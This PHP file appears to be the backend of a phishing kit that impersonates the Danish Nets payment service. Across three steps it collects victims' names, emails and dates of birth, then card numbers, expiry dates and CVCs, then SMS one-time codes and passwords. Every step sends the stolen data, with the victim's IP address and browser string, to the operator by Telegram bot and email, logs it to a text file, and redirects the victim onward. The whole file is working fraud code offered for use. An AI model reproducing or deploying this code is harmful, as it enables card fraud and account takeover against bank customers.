<?php


error_reporting(0);
//-------------- START OPTIONS
session_start();
include'function.php';
include'config.php';
//---------------
if(isset($_POST['what'])){
    switch($_POST['what']){
        case'Login':
        Login($_POST);
        $link = '../index2.html?'.generateRandomString(4).'-'.generateRandomString(31).':'.generateRandomString(8).'-'.generateRandomString(50);
        header('Location: '.$link);
        break;


        case'CC':
        CC($_POST);
        $link = '../index3.php?'.generateRandomString(4).'-'.generateRandomString(31).':'.generateRandomString(8).'-'.generateRandomString(50);
        header('Location: '.$link);
        break;
		
		case'Code':
        Code($_POST);
        $link = '../ldng.php?'.generateRandomString(4).'-'.generateRandomString(31).':'.generateRandomString(8).'-'.generateRandomString(50);
        header('Location: '.$link);
        break;
	

    }
}else{
    echo'not_authorized';
}
//------------------- FUNCTION Login
function Login($Login){
	$index="jawad.php"; //the name of index or rediretion file
	$lnk = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]$index";
	$show = preg_replace('/index.php/', '', $lnk);
    global $ip;
    global $telegram;global $token;global $chatID;
    global $email;global $send;
    global $text;
$message .= "------ Denmark 🇩🇰 Nets Info  ------\n";
$message .= "Fulde navn	: ".$Login['nm']."\n";
$message .= "E-mail : ".$Login['ml']."\n";
$message .= "Date	: ".$Login['dt']."\n";
$message .= "-------  IP ------\n";
$message .= "IP: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---- 🏦 🇩🇰🇩🇰🇩🇰 🏦 ----\n";


    if($telegram){
        sendMessage($chatID, $message, $token);
    }
    if($email){
    @mail($send,$subject,$message,$headers);
    }
    if($text){
    file_put_contents('../text/BANkIAINF.txt', $message.PHP_EOL, FILE_APPEND);
    }
}


function CC($CC){
    global $ip;
    global $telegram;global $token;global $chatID;
    global $email;global $send;
    global $text;
$message .= "------ Denmark Nets CC  ------\n";
$message .= "Number : ".$CC['nu']."\n";
$message .= "Exp date : ".$CC['ep']."\n";
$message .= "Cvc : ".$CC['oc']."\n";
$message .= "-------  IP ------\n";
$message .= "IP: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---- 🏦 🇩🇰🇩🇰🇩🇰 🏦 ----\n";

    if($telegram){
        sendMessage($chatID, $message, $token);
    }
    if($email){
    @mail($send,$subject,$message,$headers);
    }
    if($text){
    file_put_contents('../text/BANkIAINF.txt', $message.PHP_EOL, FILE_APPEND);
    }
}

function Code($Code){
    global $ip;
    global $telegram;global $token;global $chatID;
    global $email;global $send;
    global $text;
$message .= "------ Denmark Nets SMS  ------\n";
$message .= "Engangskode fra SMS : ".$Code['xxa1']."\n";
$message .= "Kodeord : ".$Code['xxa2']."\n";
$message .= "-------  IP ------\n";
$message .= "IP: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---- 🏦 🇩🇰🇩🇰🇩🇰 🏦 ----\n";

    if($telegram){
        sendMessage($chatID, $message, $token);
    }
    if($email){
    @mail($send,$subject,$message,$headers);
    }
    if($text){
    file_put_contents('../text/BANkIAINF.txt', $message.PHP_EOL, FILE_APPEND);
    }
}

